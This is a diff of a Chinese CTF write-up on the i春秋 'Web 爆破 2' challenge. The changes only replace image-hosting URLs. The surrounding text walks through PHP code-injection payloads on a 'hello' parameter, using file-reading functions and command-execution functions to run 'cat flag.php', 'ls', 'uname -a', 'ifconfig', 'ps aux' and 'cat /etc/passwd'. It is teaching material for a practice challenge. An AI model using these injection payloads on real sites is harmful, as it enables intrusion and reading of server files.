@@ -16,7 +16,7 @@ categories: [InfoSec,Web]
 
 <!-- more -->
 
-![question](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/question.png)
+![question](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/question.png)
 
 # 0x01 利用文件系统函数
 
@@ -40,7 +40,7 @@ show_source(__FILE__);
 
 尝试构造 payload `hello=file("flag.php")`，提交后直接看到 flag，证明推测正确：
 
-![file](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/file.png)
+![file](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/file.png)
 
 ## file_get_contents()
 
@@ -48,7 +48,7 @@ show_source(__FILE__);
 
 尝试构造 payload `hello=file_get_contents("flag.php") `，提交后竟未显示 flag？这是因为 flag.php 文件中的内容以界定符 `<?php` 开头，所以输出到浏览器时，该字符串被当做 PHP 脚本不予显示。但不必担心，右击页面空白处，查看网页源代码，即可看到 flag：
 
-![file_get_contents](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/file_get_contents.png)
+![file_get_contents](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/file_get_contents.png)
 
 ## show_source()
 
@@ -56,7 +56,7 @@ show_source(__FILE__);
 
 尝试构造 payload `hello=show_source("flag.php")`，提交后能看到语法高亮后的 flag：
 
-![show_source](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/show_source.png)
+![show_source](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/show_source.png)
 
 ## readfile()
 
@@ -64,7 +64,7 @@ show_source(__FILE__);
 
 在提交 payload `hello=readfile("flag.php")` 后，在网页源代码处可看到 flag：
 
-![readfile](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/readfile.png)
+![readfile](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/readfile.png)
 
 ## fread()
 
@@ -72,7 +72,7 @@ show_source(__FILE__);
 
 因此，构造 payload `hello=fread(fopen("flag.php","r"),100)`，提交后在网页源代码处可看到 flag：
 
-![fread](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/fread.png)
+![fread](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/fread.png)
 
 以上是直接读取脚本文件源码的常见函数，感兴趣的读者可深入研究。
 
@@ -82,7 +82,7 @@ show_source(__FILE__);
 
 首先，由预定义常量 [`PHP_OS`](http://php.net/manual/en/reserved.constants.php) 可知后台操作系统的类型，构造 `hello=PHP_OS` 提交后，发现是 Linux 操作系统：
 
-![php_os](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/php_os.png)
+![php_os](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/php_os.png)
 
 ## 执行运算符
 
@@ -95,7 +95,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，构造 payload ``hello=);echo `cat flag.php`;//``，提交后在网页源代码处即可看到 flag：
 
-![backticks](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/backticks.png)
+![backticks](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/backticks.png)
 
 ## system()
 
@@ -103,7 +103,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，在提交 payload `hello=);echo system("cat flag.php");//` 后，在网页源代码处可看到两个 flag，是因为第一个 flag 是由输出结果而得，第二个 flag 是由返回值而得：
 
-![system](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/system.png)
+![system](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/system.png)
 
 ## exec()
 
@@ -111,7 +111,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，在提交 payload `hello=);echo exec("cat flag.php");//` 后，直接可见 flag，因此 flag 正好是 flag.php 文件中的最后一行：
 
-![exec](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/exec.png)
+![exec](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/exec.png)
 
 ## shell_exec()
 
@@ -119,7 +119,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，构造 payload `hello=);echo shell_exec("cat flag.php");//`，提交后在网页源代码处即可看到 flag：
 
-![shell_exec](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/shell_exec.png)
+![shell_exec](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/shell_exec.png)
 
 ## passthru()
 
@@ -127,7 +127,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，构造 payload `hello=);echo passthru("cat flag.php");//`，提交后在网页源代码处即可看到 flag：
 
-![passthru](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/passthru.png)
+![passthru](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/passthru.png)
 
 ## popen()
 
@@ -135,7 +135,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，构造 payload `hello=);echo fread(popen("cat flag.php","r"),100);//`，提交后在网页源代码处即可看到 flag：
 
-![popen](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/popen.png)
+![popen](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/popen.png)
 
 以上是通过执行系统命令打印出文件内容的常见函数，感兴趣的读者可深入研究。
 
@@ -151,7 +151,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 经过笔者不断尝试，查看大部分目录下有哪些文件是没问题的，如提交 payload `hello=);echo passthru("ls ../../../");//` 后，即可看到根目录下的所有文件：
 
-![ls](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/ls.png)
+![ls](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/ls.png)
 
 ## 查看当前 Linux 版本信息
 
@@ -159,7 +159,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，构造 payload `hello=);echo passthru("uname -a");//`，提交后可见当前 Linux 内核版本为 `3.10.0-514.26.2.el7.x86_64 `：
 
-![uname](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/uname.png)
+![uname](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/uname.png)
 
 ## 查看当前网卡信息
 
@@ -167,7 +167,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，构造 payload `hello=);echo passthru("ifconfig");//`，提交后可见 eth0 网卡的 IP 地址为 `172.17.0.26`：
 
-![ifconfig](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/ifconfig.png)
+![ifconfig](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/ifconfig.png)
 
 ## 查看当前进程信息
 
@@ -175,7 +175,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，构造 payload `hello=);echo passthru("ps aux");//`，提交后可见当前所有进程的信息：
 
-![ps](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/ps.png)
+![ps](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/ps.png)
 
 ## 查看所有用户信息
 
@@ -183,7 +183,7 @@ PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.p
 
 因此，构造 payload `hello=);echo passthru("cat /etc/passwd");//`，提交后可见当前所有用户的信息：
 
-![passwd](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/passwd.png)
+![passwd](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/passwd.png)
 
 其中当前的用户名是 `apache`，不要问我是怎么知道的。
 
